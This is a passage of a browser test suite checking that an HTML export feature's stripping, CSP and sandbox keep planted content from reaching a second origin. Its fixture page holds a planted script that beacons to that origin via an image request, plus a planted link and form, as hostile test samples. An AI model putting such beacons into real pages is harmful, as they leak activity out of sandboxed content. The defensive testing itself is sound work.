        const hit = await waitHit(origins.hits, s.from, (h) => rowOf(h) === row && h.origin === 'b' && pathOf(h) === named, 20_000);
        expect(hit, `${where}: ${named} reaches B in the strip-only build (the scanner misses it; it rests on the CSP)`).not.toBeNull();
      }
      const commitsBefore = s.commits.length;
      if (click_ !== null) await click(s, click_);
      const arrived = Date.now() - t;
      const bad = await waitHit(origins.hits, s.from, stray(s, NAMED_CSS), windowFrom(Math.max(ctl.channelMs, arrived)));
      expect(bad, `${where}, ${click_ ?? 'no click'}: no channel but the two named CSS forms reached B (got ${JSON.stringify(bad)})`).toBeNull();
      expect(reached(hitsOf(s), row), `${where}: none of the 27`).toEqual([]);
      expect(bPaths(hitsOf(s), row).sort(), `${where}: exactly the two named forms`).toEqual([...NAMED_CSS].sort());
      expect(hitsOf(s).filter((h) => h.origin === 'a' && h.path.startsWith('/api/')), `${where}: nothing at A's /api/`).toEqual([]);
      if (click_ === '#planted') expect(s.commits.length, `${where}: a click on a former link fires no second document commit`).toBe(commitsBefore);
    }
  }, 240_000);
});

describe('M5.B10 row 3: the CSP only (the unstripped document under the export CSP, in sandbox="")', () => {
  it.each(WHERES)('opened from %s: no fetch-type channel reaches B; the self-navigation of the meta refresh is excluded by name; ping and the form are closed', async (where) => {
    const ctl = await control();
    const row = newRow('csp');
    const b = await buildAll(origins.b, origins.a, row, true);
    const s = await open(b.csp, where, row, 'csp');
    // The page may leave by its own refresh (named, lab 3), so the positive is a bounded wait for either the render or the refresh.
    await until('the inner document to render, or its refresh to arrive', async () => {
      if (await waitHit(origins.hits, s.from, (h) => rowOf(h) === row && pathOf(h) === '/extra/meta-refresh', 1)) return true;
      return (await rendered(s).catch(() => null)) !== null;
    });
    const bad = await waitHit(origins.hits, s.from, stray(s, [...NAMED_NAVIGATION, ...LANDING]), windowFrom(ctl.channelMs));
    expect(bad, `${where}: no fetch-type channel reached B (got ${JSON.stringify(bad)})`).toBeNull();
    expect(reached(hitsOf(s), row), `${where}: none of the 27`).toEqual([]);
    process.stderr.write(`M5B10-MEASURE csp ${where}: B paths ${JSON.stringify(bPaths(hitsOf(s), row))}\n`);
  }, 120_000);

  it.each(WHERES)('opened from %s: a click on the unstripped link navigates the frame to B (the named exclusion), and only it: no ping, no fetch', async (where) => {
    const ctl = await control();
    const row = newRow('cspk');
    const b = await buildAll(origins.b, origins.a, row, false);
    const s = await open(b.csp, where, row, 'csp-click');
    await rendered(s);
    await click(s, '#planted');
    const nav = await waitHit(origins.hits, s.from, (h) => rowOf(h) === row && h.origin === 'b' && pathOf(h) === '/extra/link-click', Math.max(20_000, 3 * ctl.clickMs));
    process.stderr.write(`M5B10-MEASURE csp ${where}: the click ${nav === null ? 'did NOT' : 'did'} reach B (a named self-navigation)\n`);
    // The positive that the click happened and took effect: the CSP does not stop navigation (lab 3), and a `ping` rides the same click.
    expect(nav, `${where}: the click on the unstripped link navigated the frame to B (named)`).not.toBeNull();
    const bad = await waitHit(origins.hits, s.from, stray(s, [...NAMED_NAVIGATION, ...LANDING]), windowFrom(ctl.clickMs));
    expect(bad, `${where}: nothing but the navigation reached B (got ${JSON.stringify(bad)})`).toBeNull();
    expect(reached(hitsOf(s), row), `${where}: none of the 27`).toEqual([]);
  }, 120_000);

  it.each(WHERES)('opened from %s: the form tapped reaches nothing (the CSP form-action, and the empty sandbox)', async (where) => {
    const ctl = await control();
    const row = newRow('cspf');
    const b = await buildAll(origins.b, origins.a, row, false);
    const s = await open(b.csp, where, row, 'csp-form');
    await rendered(s);
    await click(s, '#planted-submit');
    const bad = await waitHit(origins.hits, s.from, stray(s, []), windowFrom(ctl.clickMs));
    expect(bad, `${where}: the form reached nothing (got ${JSON.stringify(bad)})`).toBeNull();
  }, 120_000);
});

// ---- the real Save in the real app -------------------------------------------------------------------------------------------

/** The hostile-enough source of the app rows: a planted script (which sets a flag and beacons to B), a stylesheet asset, and a
 *  planted link. `asset` is the stylesheet the page inlines. */
const appSource = (b: string, row: string, asset: string): string => `<!doctype html><html><head><meta charset="utf-8"><title>App mockup</title>
<link rel="stylesheet" href="${asset}"></head><body><h1>App mockup</h1><p id="themed">themed</p>
<a id="planted" href="${b}/app/link?row=${row}">planted</a>
<script>window.__planted=1;new Image().src='${b}/app/ran?row=${row}';</script></body></html>`;

interface DocText { readonly committed: string; readonly draft: string | null }
const APP_DOCS = new Map<string, DocText>();
const blobOf = (p: string): string => Buffer.from(p).toString('hex').padEnd(40, '0').slice(0, 40);

function docsAnswer(url: URL): { status: number; headers: Record<string, string>; body: string } {
  const json = 'application/json; charset=utf-8';
  if (url.pathname.endsWith('/tree')) {
    const entries = [...APP_DOCS].map(([p, t]) => entry(SECTION, p, {
      committed: { kind: 'file', blob: blobOf(p), size: Buffer.byteLength(t.committed) },
      ...(t.draft === null ? {} : { draft: draftOf('modified', { size: Buffer.byteLength(t.draft) }) }),
    }));
    return { status: 200, headers: { ...DOCS_RESPONSE_HEADERS, 'content-type': json }, body: JSON.stringify(treeResponse(treeOk({ entries, drafts: holder() }))) };
  }
  const p = url.searchParams.get('path') ?? '';
  const t = APP_DOCS.get(p);
  const draft = url.searchParams.has('fp');
  if (t === undefined || (draft && t.draft === null)) return { status: 404, headers: { 'content-type': json }, body: JSON.stringify({ ok: false, failure: 'not-a-file' }) };
  const text = draft ? t.draft ?? '' : t.committed;
  const common = { v: 1, verb: 'docs-show', ok: true, elapsedMs: 3, section: SECTION, path: p, size: Buffer.byteLength(text), encoding: 'utf8', text };
  const show = draft
    ? { ...common, source: 'draft', sha256: FP_1, worktree: '/repo/demo', branch: 'main', head: COMMIT_A, fp: FP_1 }
    : { ...common, source: 'committed', sha256: blobOf(p).padEnd(64, '0'), commit: COMMIT_A, blob: blobOf(p), onRef: 'contains' };
  const cls = p.endsWith('.html') ? 'html' : 'text';
  return { status: 200, headers: { ...DOCS_RESPONSE_HEADERS, 'content-type': json }, body: JSON.stringify({ ok: true, contentClass: cls, from: 'ccd', show }) };
}

/** Wraps `URL.createObjectURL` so the page records the type of every Blob it makes a URL for. */
const BLOB_HOOK = `(() => {
  window.__blobTypes = [];
  const make = URL.createObjectURL.bind(URL);
  URL.createObjectURL = (b) => { window.__blobTypes.push(b.type); return make(b); };
})();`;

interface AppRun { readonly page: Page; readonly ctx: BrowserContext; readonly navigations: string[]; readonly downloads: string[] }
async function openDocs(): Promise<AppRun> {
  const app = await openApp(browser, { width: 1280, skin: REFINED, theme: 'light' }, { api: {}, fleetFrames: [] });
  contexts.push(app.ctx);
  await app.ctx.addInitScript(BLOB_HOOK);
  await app.ctx.route((u) => u.pathname.startsWith('/api/docs/'), async (route) => {
    const req = route.request();
    if (req.method() !== 'GET') { await route.fulfill({ status: 204 }); return; }
    const a = docsAnswer(new URL(req.url()));
    await route.fulfill({ status: a.status, headers: a.headers, body: a.body });
  });
  const navigations: string[] = [];
  const downloads: string[] = [];
  app.page.on('framenavigated', (f) => { navigations.push(f.url()); });
  app.page.on('download', (d) => { downloads.push(d.suggestedFilename()); });
  return { page: app.page, ctx: app.ctx, navigations, downloads };
}

const leaf = (name: string, ref = false): string => `${server.origin}/docs/${PROJECT}/${SECTION}/${name}${ref ? '?ref=main' : ''}`;
const framed = (page: Page): Promise<void> => page.locator('.docs-mockup[data-state="framed"]').waitFor({ timeout: 60_000 });

/** Taps Export (once it is offered and enabled) and waits for the sheet's Save button. */
async function openExportSheet(page: Page): Promise<void> {
  const exportButton = page.getByRole('button', { name: 'Export', exact: true });
  await until('Export to be enabled', async () => (await exportButton.isEnabled({ timeout: 2000 })) || null, 60_000);
  await exportButton.click();
  await page.getByRole('button', { name: /^Save .*\.html \(/ }).waitFor({ timeout: 60_000 });
}
const saveButton = (page: Page) => page.getByRole('button', { name: /^Save .*\.html \(/ });

describe('the real Save in the real app (the Export sheet, `downloadExport`, the confirm)', () => {
  beforeAll(async () => {
    // The run's one shared build (`browser/globalSetup.ts`), in the shape `test/browser-dist.test.ts` pins.
    dist = sharedDist();
    server = await serveDist(dist);
  }, 240_000);

  it('with no draft asset the first Save tap downloads (the control, and the latency the negative below takes its window from)', async () => {
    const row = newRow('app');
    APP_DOCS.set('c.html', { committed: appSource(origins.b, row, 'plain.css'), draft: null });
    APP_DOCS.set('plain.css', { committed: '#themed{background-color:rgb(1, 2, 3)}', draft: null });
    const run = await openDocs();
    await run.page.goto(leaf('c.html'));
    await framed(run.page);
    await openExportSheet(run.page);
    const t0 = Date.now();
    const [dl] = await Promise.all([run.page.waitForEvent('download', { timeout: 20_000 }), saveButton(run.page).click()]);
    appLatency = Date.now() - t0;
    expect(dl.suggestedFilename(), 'a committed export is not named -draft').toMatch(/\.html$/);
    expect(dl.suggestedFilename()).not.toMatch(/-draft\.html$/);
    expect(await run.page.locator('[role="alert"]', { hasText: 'uncommitted file' }).count(), 'no confirm for a file with no draft asset').toBe(0);
    expect(run.navigations.filter((u) => u.startsWith('blob:') || u.startsWith('data:')), 'the page did not navigate to a blob: or data: URL').toEqual([]);
  }, 180_000);

  it('a draft page inlining a draft asset: the first Save tap saves nothing and confirms, the second downloads one `-draft.html` typed octet-stream, and the file runs no script', async () => {
    const row = newRow('appd');
    APP_DOCS.set('m.html', { committed: '<p>committed</p>', draft: appSource(origins.b, row, 'theme.css') });
    APP_DOCS.set('theme.css', { committed: '#themed{background-color:rgb(9, 9, 9)}', draft: '#themed{background-color:rgb(1, 2, 3)}' });
    const run = await openDocs();
    await run.page.goto(leaf('m.html', true));
    await framed(run.page);
    const pageUrl = run.page.url();
    await openExportSheet(run.page);

    // First tap: nothing downloads, the confirm sentence shows. The confirm is the positive; the window is taken from the control's latency.
    await saveButton(run.page).click();
    const tree = treeOk({ entries: [], drafts: holder() });
    const sentence = fillSentence(EXPORT_TEXT.draftConfirm, { k: 1, s: pluralS(1), label: exportWorktreeLabel(tree) });
    await run.page.locator('[role="alert"]', { hasText: sentence }).waitFor({ timeout: 20_000 });
    const window_ = windowFrom(appLatency ?? 1500);
    const end = Date.now() + window_;
    while (Date.now() < end) {
      expect(run.downloads, 'nothing downloaded on the first tap').toEqual([]);
      await sleep(50);
    }
    expect(run.downloads, 'nothing downloaded on the first tap').toEqual([]);

    // Second tap: the confirm's Save is the gesture; one download fires.
    const [dl] = await Promise.all([run.page.waitForEvent('download', { timeout: 20_000 }), saveButton(run.page).click()]);
    expect(dl.suggestedFilename(), 'the saved name ends -draft.html').toMatch(/-draft\.html$/);
    expect(run.page.url(), 'the page did not navigate').toBe(pageUrl);
    expect(run.navigations.filter((u) => u.startsWith('blob:') || u.startsWith('data:')), 'the page did not navigate to a blob: or data: URL').toEqual([]);
    expect(run.ctx.pages().length, 'no popup').toBe(1);
    const types = await run.page.evaluate(() => (window as unknown as { __blobTypes: string[] }).__blobTypes);
    expect(types.at(-1), 'the save blob is octet-stream, never an active type').toBe('application/octet-stream');
    expect(types.filter((t) => /html|svg|xml/.test(t)), 'no active-type blob at all').toEqual([]);
    expect(await run.page.evaluate(() => (window as unknown as Record<string, unknown>)['__planted']), 'no app-origin execution of the planted script').toBeUndefined();
    expect(run.downloads, 'exactly one download').toHaveLength(1);

    // The downloaded file, opened top-level from file://.
    const saved = path.join(dir, `app-${row}.html`);
    await dl.saveAs(saved);
    const ctx2 = await browser.newContext();
    contexts.push(ctx2);
    const tab = await ctx2.newPage();
    const from = origins.hits.length;
    await tab.goto(pathToFileURL(saved).href, { waitUntil: 'load' });
    const provenance = tab.locator(`section[aria-label="${EXPORT_TEXT.provenance}"]`);
    expect(await provenance.count(), 'the saved file renders its provenance').toBe(1);
    expect(await provenance.innerText(), 'the provenance names the page').toContain('m.html');
    expect(await tab.locator('iframe').count(), 'the saved file holds one inner frame').toBe(1);
    expect(await tab.locator('body').innerText(), 'the file lists the draft file it inlined as uncommitted').toContain(EXPORT_TEXT.fileDraft);
    const themed = await until('the inner document to render', async () => {
      const c = await tab.frameLocator('iframe').locator('#themed').evaluate((el) => getComputedStyle(el).backgroundColor, undefined, { timeout: 3000 });
      return c === 'rgb(1, 2, 3)' ? c : null;
    });
    expect(themed, 'the draft asset the file inlined applies (not the committed one)').toBe('rgb(1, 2, 3)');
    const flag = await tab.frameLocator('iframe').locator('body').evaluate(() => (window as unknown as Record<string, unknown>)['__planted'], undefined, { timeout: 5000 });
    expect(flag, 'the planted script did not run in the saved file').toBeUndefined();
    expect(await tab.evaluate(() => (window as unknown as Record<string, unknown>)['__planted']), 'nor at the top level').toBeUndefined();
    expect(await waitHit(origins.hits, from, (h) => rowOf(h) === row, windowFrom(appLatency ?? 1500)), 'the planted script\'s beacon never reached B').toBeNull();
  }, 240_000);
});

